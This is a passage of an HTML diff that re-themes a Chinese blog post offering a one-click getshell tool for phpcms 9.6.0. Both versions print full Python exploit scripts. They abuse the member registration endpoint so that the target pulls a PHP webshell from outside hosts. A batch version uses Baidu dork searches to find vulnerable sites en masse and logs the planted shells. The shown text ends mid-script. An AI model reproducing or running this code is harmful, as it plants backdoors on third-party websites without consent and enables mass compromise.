@@ -1,1157 +1,477 @@
-<!doctype html>
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=1, minimum-scale=1, maximum-scale=1">
+<meta name="renderer" content="webkit">
+<meta name="google" value="notranslate">
+<meta name="robots" content="index,follow">
 
 
-
-  
-
-
-<html class="theme-next mist use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
-
-
-
-
-  
-  
-  
-  
-
-  
-    
-    
-  
-
-  
-    
-      
-    
-
-    
-  
-
-  
-    
-      
-    
-
-    
-  
-
-  
-
-  
-    
-      
-    
-
-    
-  
-
-  
-    
-    
-    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|sans-serif:300,300italic,400,400italic,700,700italic|Lato:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
-  
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
-
-
-  <meta name="keywords" content="Tools," />
-
-
-
-
-
-  <link rel="alternate" href="/atom.xml" title="Akkuman Blog" type="application/atom+xml" />
-
-
-
-
-  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
-
-
-
-
-
-
-<meta name="description" content="介绍
-一键化python 1.py http://xxx.com,如果是批量直接运行py文件即可
-
-待办
-[] 加入对有验证码phpcms网站的支持
-[] 加入批量(已完成)">
-<meta property="og:type" content="article">
-<meta property="og:title" content="phpcms9-6-0 一键getshell工具">
-<meta property="og:url" content="http://hacktech.cn/2017/04/10/phpcms9-6-0-getshell-with-python.html">
-<meta property="og:site_name" content="Akkuman Blog">
-<meta property="og:description" content="介绍
-一键化python 1.py http://xxx.com,如果是批量直接运行py文件即可
-
-待办
-[] 加入对有验证码phpcms网站的支持
-[] 加入批量(已完成)">
-<meta property="og:image" content="https://ooo.0o0.ooo/2017/04/10/58eb6a69d5676.png">
-<meta property="og:image" content="https://ooo.0o0.ooo/2017/04/11/58ec642d6578f.png">
-<meta property="og:updated_time" content="2017-04-11T05:12:31.699Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="phpcms9-6-0 一键getshell工具">
-<meta name="twitter:description" content="介绍
-一键化python 1.py http://xxx.com,如果是批量直接运行py文件即可
+<meta name="twitter:title" content="Akkuman">
+<meta name="twitter:description" content="Akkuman的技术博客">
+<meta name="twitter:image:src" content="https://ink-theme-story.pancakeapps.com/images/avatar.png">
 
-待办
-[] 加入对有验证码phpcms网站的支持
-[] 加入批量(已完成)">
-<meta name="twitter:image" content="https://ooo.0o0.ooo/2017/04/10/58eb6a69d5676.png">
+<meta property="og:url" content="https://ink-theme-story.pancakeapps.com">
+<meta property="og:title" content="Akkuman">
+<meta property="og:description" content="Akkuman的技术博客">
+<meta property="og:site_name" content="Akkuman">
+<meta property="og:image" content="https://ink-theme-story.pancakeapps.com/images/avatar.png">
+<meta property="og:type" content="website">
+<meta name="robots" content="noodp">
+
+<meta itemprop="name" content="Akkuman">
+<meta itemprop="description" content="Akkuman的技术博客">
+<meta itemprop="image" content="https://ink-theme-story.pancakeapps.com/images/avatar.png">
+
+<link rel="canonical" href="https://ink-theme-story.pancakeapps.com">
+
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="apple-itouch-icon" href="/favicon.png">
+
+<link type="text/css" rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/4.0.0/css/bootstrap.min.css">
+<link type="text/css" rel="stylesheet" href="/bundle/css/prism.css">
+<link type="text/css" rel="stylesheet" href="/bundle/css/zoom.css">
+<link type="text/css" rel="stylesheet" href="/bundle/css/main.css">
+<script src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 
 
 
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Mist',
-    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
-    fancybox: true,
-    motion: true,
-    duoshuo: {
-      userId: '6230266985318450000',
-      author: 'Author'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
+<script>var cPlayers = [];var cPlayerOptions = [];</script>
+
+
+<script type="text/javascript">
+    var timeSinceLang = {
+        year: '年前',
+        month: '个月前',
+        day: '天前',
+        hour: '小时前',
+        minute: '分钟前',
+        second: '秒前'
+    };
+    var root = '';
 </script>
 
 
-
-  <link rel="canonical" href="http://hacktech.cn/2017/04/10/phpcms9-6-0-getshell-with-python.html"/>
-
-
-
-
-
-  <title> phpcms9-6-0 一键getshell工具 | Akkuman Blog </title>
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail ">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Akkuman Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-      
-        <p class="site-subtitle">Python & Hacker</p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
+        <meta name="keywords" content="Tools,">
+        <meta name="description" content="phpcms9-6-0 一键getshell工具">
+        <meta name="author" content="Akkuman">
+        <title>phpcms9-6-0 一键getshell工具</title>
+    </head>
+    <body>
         
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            首页
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            分类
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-about">
-          <a href="/about" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
-            
-            关于
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            归档
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            标签
-          </a>
-        </li>
-      
-
-      
-        <li class="menu-item menu-item-search">
-          
-            <a href="javascript:;" class="popup-trigger">
-          
-            
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
-            
-            搜索
-          </a>
-        </li>
-      
-    </ul>
-  
-
-  
-    <div class="site-search">
-      
-  <div class="popup search-popup local-search-popup">
-  <div class="local-search-header clearfix">
-    <span class="search-icon">
-      <i class="fa fa-search"></i>
-    </span>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-    <div class="local-search-input-wrapper">
-      <input autocapitalize="off" autocomplete="off" autocorrect="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
-    </div>
-  </div>
-  <div id="local-search-result"></div>
-</div>
-
-
-
-    </div>
-  
-</nav>
-
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://hacktech.cn/2017/04/10/phpcms9-6-0-getshell-with-python.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Akkuman">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/pic/avator.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Akkuman Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                phpcms9-6-0 一键getshell工具
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-10T13:13:29+08:00">
-                2017-04-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Tools/" itemprop="url" rel="index">
-                    <span itemprop="name">Tools</span>
-                  </a>
-                </span>
-
+        <header id="header" class="clearfix">
+  <div class="container-fluid">
+      <div class="row">
+          <div class="logo">
+              <div class="header-logo">
+                <script>
+                  var getwbclass = function() {
+                    var wbclass = ['b', 'w'];
+                    return wbclass[Math.floor(Math.random()*wbclass.length)];
+                  }
+                  var sitetitle = "Akkuman";
+                  for (i in sitetitle) {
+                    document.write('<a href="/"><span class="' + getwbclass() + ' titlechar">' + sitetitle.charAt(i) + '</span></a>');
+                  }          
+                  
+                </script>
                 
+                <a id="btn-menu" href="javascript:isMenu();">
+                    <span class="b">·</span>
+                </a>
+                <a href="javascript:isMenu1();">
+                    <span id="menu-1" class="bf">1</span>
+                </a>
+                <a href="javascript:isMenu2();">
+                    <span id="menu-2" class="bf">2</span>
+                </a>
+                <a href="javascript:isMenu3();">
+                    <span id="menu-3" class="bf">3</span>
+                </a>
+              </div>
+              <div id="menu-page">
+                <a href="/archive.html"><li>归档</li></a>
+                <a href="/tag.html"><li>标签</li></a>
                 
-              
-            </span>
-          
+                <a href="/atom.xml"><li>订阅</li></a>
+                
+                <a href="/about.html"><li>关于</li></a>
+              </div>
+              <div id="search-box">
+                  <div id="search">
+                      <input autocomplete="off" type="text" name="s" id="menu-search" placeholder="搜索..." data-root="" />
+                  </div>
+              </div>
+          </div>
+      </div>
+  </div>
+  </header>
+        <div id="body" class="clearfix">
+            <div class="container-fluid">
+                <div class="row">
+                    <div id="main" class="col-12 clearfix" role="main">
+                        <article class="posti" itemscope itemtype="http://schema.org/BlogPosting">
+                            <h1 class="post-title" itemprop="name headline">phpcms9-6-0 一键getshell工具</h1>
+                            <div class="post-meta">
+                                <p>
+                                    Written by <a itemprop="name" href="/about.me.html" rel="author">Akkuman</a> with ♥ on <time datetime="1491801209" itemprop="datePublished"></time> in <a href="/tag/Tools/index.html">Tools </a>
+                                </p>
+                            </div>
+                            <div class="post-content" itemprop="articleBody">
+                                <h2>介绍</h2>
 
-          
-            
-          
-
-          
-          
-
-          
-            <span class="post-meta-divider">|</span>
-            <span class="page-pv"><i class="fa fa-file-o"></i>
-            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
-            </span>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
+<ul>
 <li>一键化<code>python 1.py http://xxx.com</code>,如果是批量直接运行py文件即可</li>
 </ul>
-<h2 id="待办"><a href="#待办" class="headerlink" title="待办"></a>待办</h2><ul>
+
+<h2>待办</h2>
+
+<ul>
 <li>[] 加入对有验证码phpcms网站的支持</li>
 <li>[] 加入批量(<strong>已完成</strong>)</li>
 </ul>
-<a id="more"></a>
-<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>依赖库的安装<code>pip install requests</code></p>
-<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">----------------------</div><div class="line">Author : Akkuman</div><div class="line">Blog   : hacktech.cn</div><div class="line">----------------------</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</div><div class="line"></div><div class="line">chars = <span class="string">'qwertyuiopasdfghjklzxcvbnm0123456789'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</div><div class="line">        print(<span class="string">"[*]Usage   : Python 1.py http://xxx.com"</span>)</div><div class="line">        sys.exit()</div><div class="line">    host = sys.argv[<span class="number">1</span>]</div><div class="line">    url = host + <span class="string">"/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span></div><div class="line"></div><div class="line">    data = &#123;</div><div class="line">        <span class="string">"siteid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"modelid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"username"</span>: <span class="string">"dsakkfaffdssdudi"</span>,</div><div class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line">        <span class="string">"email"</span>: <span class="string">"dsakkfddsjdi@qq.com"</span>,</div><div class="line">        <span class="comment"># 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0</span></div><div class="line">        <span class="string">"info[content]"</span>: <span class="string">"&lt;img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg&gt;"</span>,</div><div class="line">        <span class="string">"dosubmit"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"protocol"</span>: <span class="string">""</span>,</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        rand_name = chars[Random().randint(<span class="number">0</span>, len(chars) - <span class="number">1</span>)]</div><div class="line">        data[<span class="string">"username"</span>] = <span class="string">"akkuman_%s"</span> % rand_name</div><div class="line">        data[<span class="string">"email"</span>] = <span class="string">"akkuman_%s@qq.com"</span> % rand_name</div><div class="line">        </div><div class="line">        htmlContent = requests.post(url, data=data)</div><div class="line"></div><div class="line">        successUrl = <span class="string">""</span></div><div class="line">        <span class="keyword">if</span> <span class="string">"MySQL Error"</span> <span class="keyword">in</span> htmlContent.text <span class="keyword">and</span> <span class="string">"http"</span> <span class="keyword">in</span> htmlContent.text:</div><div class="line">            successUrl = htmlContent.text[htmlContent.text.index(<span class="string">"http"</span>):htmlContent.text.index(<span class="string">".php"</span>)] + <span class="string">".php"</span></div><div class="line">            print(<span class="string">"[*]Shell  : %s"</span> % successUrl)</div><div class="line">        <span class="keyword">if</span> successUrl == <span class="string">""</span>:</div><div class="line">            print(<span class="string">"[x]Failed : had crawled all possible url, but i can't find out it. So it's failed.\n"</span>)</div><div class="line"></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        print(<span class="string">"Request Error"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
-<h2 id="批量"><a href="#批量" class="headerlink" title="批量"></a>批量</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">----------------------</div><div class="line">Author : Akkuman</div><div class="line">Blog   : hacktech.cn</div><div class="line">----------------------</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="comment"># from urlparse import unquote //Python2</span></div><div class="line"><span class="comment"># from urlparse import urlparse //Python2</span></div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</div><div class="line"></div><div class="line">chars = <span class="string">'qwertyuiopasdfghjklzxcvbnm0123456789'</span></div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseBaidu</span><span class="params">(keyword, pagenum)</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'https://www.baidu.com/s?wd='</span> + str(quote(keyword)) + <span class="string">'&amp;oq='</span> + str(quote(keyword)) + <span class="string">'&amp;ie=utf-8'</span> + <span class="string">'&amp;pn='</span></div><div class="line">    pnum = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> pnum &lt;= int(pagenum):</div><div class="line">        baseURL = keywordsBaseURL + str(pnum*<span class="number">10</span>)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            request = requests.get(baseURL, headers=headers)</div><div class="line">            soup = BeautifulSoup(request.text, <span class="string">"html.parser"</span>)</div><div class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> soup.select(<span class="string">'div.c-container &gt; h3 &gt; a'</span>):</div><div class="line">                url = requests.get(a[<span class="string">'href'</span>], headers=headers).url</div><div class="line">                <span class="keyword">yield</span> url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">yield</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            pnum += <span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveShell</span><span class="params">(shellUrl)</span>:</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">"webShell.txt"</span>,<span class="string">"a+"</span>) <span class="keyword">as</span> f:</div><div class="line">        f.write(<span class="string">"[*]%s\n"</span> % shellUrl)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    data = &#123;</div><div class="line">        <span class="string">"siteid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"modelid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"username"</span>: <span class="string">"akkumandsad"</span>,</div><div class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line">        <span class="string">"email"</span>: <span class="string">"akkakkumafa@qq.com"</span>,</div><div class="line">        <span class="comment"># 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0,普通一句话http://file.codecat.one/normalOneWord.txt</span></div><div class="line">        <span class="string">"info[content]"</span>: <span class="string">"&lt;img src=http://7xusrl.com1.z0.glb.clouddn.com/bypassdog.txt?.php#.jpg&gt;"</span>,</div><div class="line">        <span class="string">"dosubmit"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"protocol"</span>: <span class="string">""</span>,</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> crawlUrl <span class="keyword">in</span> parseBaidu(<span class="string">"inurl:index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span>, <span class="number">10</span>):</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">if</span> crawlUrl:</div><div class="line">                rand_name = chars[Random().randint(<span class="number">0</span>, len(chars) - <span class="number">1</span>)]</div><div class="line">                data[<span class="string">"username"</span>] = <span class="string">"akkuman_%s"</span> % rand_name</div><div class="line">                data[<span class="string">"email"</span>] = <span class="string">"akkuman_%s@qq.com"</span> % rand_name</div><div class="line">                host = urlparse(crawlUrl).scheme + <span class="string">"://"</span> + urlparse(crawlUrl).hostname</div><div class="line">                url = host + <span class="string">"/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span></div><div class="line">                htmlContent = requests.post(url, data=data, timeout=<span class="number">10</span>)</div><div class="line">                successUrl = <span class="string">""</span></div><div class="line">                <span class="keyword">if</span> <span class="string">"MySQL Error"</span> <span class="keyword">in</span> htmlContent.text <span class="keyword">and</span> <span class="string">"http"</span> <span class="keyword">in</span> htmlContent.text:</div><div class="line">                    successUrl = htmlContent.text[htmlContent.text.index(<span class="string">"http"</span>):htmlContent.text.index(<span class="string">".php"</span>)] + <span class="string">".php"</span></div><div class="line">                    print(<span class="string">"[*]Shell  : %s"</span> % successUrl)</div><div class="line">                    saveShell(successUrl)</div><div class="line">                <span class="keyword">if</span> successUrl == <span class="string">""</span>:</div><div class="line">                    print(<span class="string">"[x]Failed : Failed to getshell."</span>)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">continue</span></div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            print(<span class="string">"Request Error"</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
-<h2 id="测试图"><a href="#测试图" class="headerlink" title="测试图"></a>测试图</h2><h3 id="单个"><a href="#单个" class="headerlink" title="单个"></a>单个</h3><p><img src="https://ooo.0o0.ooo/2017/04/10/58eb6a69d5676.png" alt="TIM图片20170410191951.png"></p>
-<h3 id="批量-1"><a href="#批量-1" class="headerlink" title="批量"></a>批量</h3><p><img src="https://ooo.0o0.ooo/2017/04/11/58ec642d6578f.png" alt="TIM图片20170410225257.png"></p>
-<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="http://file.codecat.one/phpcms/" target="_blank" rel="external">代码下载地址</a></p>
 
-      
-    </div>
+<h2>说明</h2>
 
-    <div>
-      
+<p>依赖库的安装<code>pip install requests</code></p>
+
+<h2>代码</h2>
+
+<pre><code class="language-python"># -*- coding:utf-8 -*-
+
+'''
+----------------------
+Author : Akkuman
+Blog   : hacktech.cn
+----------------------
+'''
+
+import requests
+import sys
+from random import Random
+
+chars = 'qwertyuiopasdfghjklzxcvbnm0123456789'
+
+def main():
+    if len(sys.argv) &lt; 2:
+        print(&quot;[*]Usage   : Python 1.py http://xxx.com&quot;)
+        sys.exit()
+    host = sys.argv[1]
+    url = host + &quot;/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&quot;
+
+    data = {
+        &quot;siteid&quot;: &quot;1&quot;,
+        &quot;modelid&quot;: &quot;1&quot;,
+        &quot;username&quot;: &quot;dsakkfaffdssdudi&quot;,
+        &quot;password&quot;: &quot;123456&quot;,
+        &quot;email&quot;: &quot;dsakkfddsjdi@qq.com&quot;,
+        # 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0
+        &quot;info[content]&quot;: &quot;&lt;img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg&gt;&quot;,
+        &quot;dosubmit&quot;: &quot;1&quot;,
+        &quot;protocol&quot;: &quot;&quot;,
+    }
+    try:
+        rand_name = chars[Random().randint(0, len(chars) - 1)]
+        data[&quot;username&quot;] = &quot;akkuman_%s&quot; % rand_name
+        data[&quot;email&quot;] = &quot;akkuman_%s@qq.com&quot; % rand_name
         
+        htmlContent = requests.post(url, data=data)
 
-      
-    </div>
+        successUrl = &quot;&quot;
+        if &quot;MySQL Error&quot; in htmlContent.text and &quot;http&quot; in htmlContent.text:
+            successUrl = htmlContent.text[htmlContent.text.index(&quot;http&quot;):htmlContent.text.index(&quot;.php&quot;)] + &quot;.php&quot;
+            print(&quot;[*]Shell  : %s&quot; % successUrl)
+        if successUrl == &quot;&quot;:
+            print(&quot;[x]Failed : had crawled all possible url, but i can't find out it. So it's failed.\n&quot;)
 
-    <div>
-      
+    except:
+        print(&quot;Request Error&quot;)
+
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+
+<h2>批量</h2>
+
+<pre><code class="language-python"># -*- coding:utf-8 -*-
+
+'''
+----------------------
+Author : Akkuman
+Blog   : hacktech.cn
+----------------------
+'''
+
+import requests
+from bs4 import BeautifulSoup
+# from urlparse import unquote //Python2
+# from urlparse import urlparse //Python2
+from urllib.parse import quote
+from urllib.parse import urlparse
+from random import Random
+
+chars = 'qwertyuiopasdfghjklzxcvbnm0123456789'
+
+headers = {
+    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0&quot;
+}
+
+def parseBaidu(keyword, pagenum):
+    keywordsBaseURL = 'https://www.baidu.com/s?wd=' + str(quote(keyword)) + '&amp;oq=' + str(quote(keyword)) + '&amp;ie=utf-8' + '&amp;pn='
+    pnum = 0
+    while pnum &lt;= int(pagenum):
+        baseURL = keywordsBaseURL + str(pnum*10)
+        try:
+            request = requests.get(baseURL, headers=headers)
+            soup = BeautifulSoup(request.text, &quot;html.parser&quot;)
+            for a in soup.select('div.c-container &gt; h3 &gt; a'):
+                url = requests.get(a['href'], headers=headers).url
+                yield url
+        except:
+            yield None
+        finally:
+            pnum += 1
+
+
+def saveShell(shellUrl):
+    with open(&quot;webShell.txt&quot;,&quot;a+&quot;) as f:
+        f.write(&quot;[*]%s\n&quot; % shellUrl)
+
+def main():
+    data = {
+        &quot;siteid&quot;: &quot;1&quot;,
+        &quot;modelid&quot;: &quot;1&quot;,
+        &quot;username&quot;: &quot;akkumandsad&quot;,
+        &quot;password&quot;: &quot;123456&quot;,
+        &quot;email&quot;: &quot;akkakkumafa@qq.com&quot;,
+        # 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0,普通一句话http://file.codecat.one/normalOneWord.txt
+        &quot;info[content]&quot;: &quot;&lt;img src=http://7xusrl.com1.z0.glb.clouddn.com/bypassdog.txt?.php#.jpg&gt;&quot;,
+        &quot;dosubmit&quot;: &quot;1&quot;,
+        &quot;protocol&quot;: &quot;&quot;,
+    }
+    for crawlUrl in parseBaidu(&quot;inurl:index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&quot;, 10):
+        try:
